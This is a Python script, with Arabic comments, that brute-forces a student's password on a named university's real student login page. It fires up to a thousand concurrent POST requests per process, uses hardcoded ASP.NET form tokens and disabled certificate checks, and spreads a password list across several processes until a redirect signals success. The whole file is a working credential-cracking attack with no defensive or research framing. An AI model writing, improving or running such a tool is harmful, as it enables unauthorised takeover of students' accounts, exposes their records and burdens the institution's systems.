"""
محرك الهجوم فائق السرعة - يدعم asyncio و multiprocessing
"""

import asyncio
import aiohttp
import ssl
from concurrent.futures import ProcessPoolExecutor
from multiprocessing import cpu_count, Manager
import time

class UltraFastAttackEngine:
    """محرك الهجوم غير المتزامن فائق السرعة"""
    
    def __init__(self, student_id, passwords, config=None):
        self.student_id = student_id
        self.passwords = passwords
        self.found_password = None
        self.found_location = None
        self.checked = 0
        self.active = True
        
        # إعدادات الأداء
        self.config = config or {
            'concurrent_requests': 1000,
            'batch_size': 5000,
            'timeout': 2,
        }
        
        self.viewstate = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
        self.viewstategenerator = "B71B77C3"
        
    async def check_password(self, session, password):
        """فحص كلمة سر واحدة"""
        if not self.active or self.found_password:
            return None
        
        try:
            data = {
                "__EVENTTARGET": "ctl00$Main$btnLogin",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": self.viewstate,
                "__VIEWSTATEGENERATOR": self.viewstategenerator,
                "ctl00$Main$txtID": self.student_id,
                "ctl00$Main$txtPassword": str(password)
            }
            
            async with session.post(
                "https://eng.modern-academy.edu.eg/university/student/login.aspx",
                headers={"User-Agent": "Mozilla/5.0"},
                data=data,
                allow_redirects=False,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=self.config['timeout'])
            ) as response:
                self.checked += 1
                
                if response.status == 302:
                    self.found_password = str(password)
                    self.found_location = response.headers.get('Location', '')
                    self.active = False
                    return password
                return None
                
        except Exception:
            self.checked += 1
            return None
    
    async def run_async(self):
        """تشغيل الهجوم بشكل غير متزامن"""
        connector = aiohttp.TCPConnector(
            limit=self.config['concurrent_requests'],
            limit_per_host=self.config['concurrent_requests'],
            ssl=False
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(self.config['concurrent_requests'])
            
            async def limited_check(pwd):
                async with semaphore:
                    return await self.check_password(session, pwd)
            
            for i in range(0, len(self.passwords), self.config['batch_size']):
                if not self.active or self.found_password:
                    break
                
                batch = self.passwords[i:i + self.config['batch_size']]
                tasks = [limited_check(pwd) for pwd in batch]
                results = await asyncio.gather(*tasks)
                
                for result in results:
                    if result:
                        return result
        
        return None
    
    def run(self):
        """تشغيل المحرك"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(self.run_async())
        finally:
            loop.close()


class MultiProcessAttackEngine:
    """محرك متعدد العمليات لاستخدام كل CPUs"""
    
    def __init__(self, student_id, passwords, num_processes=None):
        self.student_id = student_id
        self.passwords = passwords
        self.num_processes = num_processes or min(cpu_count(), 4)
        self.active = True
        
    def worker(self, passwords_chunk):
        """دالة العامل لكل عملية"""
        engine = UltraFastAttackEngine(self.student_id, passwords_chunk)
        return engine.run()
    
    def run(self):
        """تشغيل المحرك متعدد العمليات"""
        # تقسيم كلمات السر
        chunk_size = max(1, len(self.passwords) // self.num_processes)
        chunks = [self.passwords[i:i + chunk_size] for i in range(0, len(self.passwords), chunk_size)]
        
        with ProcessPoolExecutor(max_workers=self.num_processes) as executor:
            futures = [executor.submit(self.worker, chunk) for chunk in chunks]
            
            for future in futures:
                try:
                    result = future.result(timeout=30)
                    if result:
                        return {'found': result, 'location': ''}
                except Exception:
                    continue
        
        return None
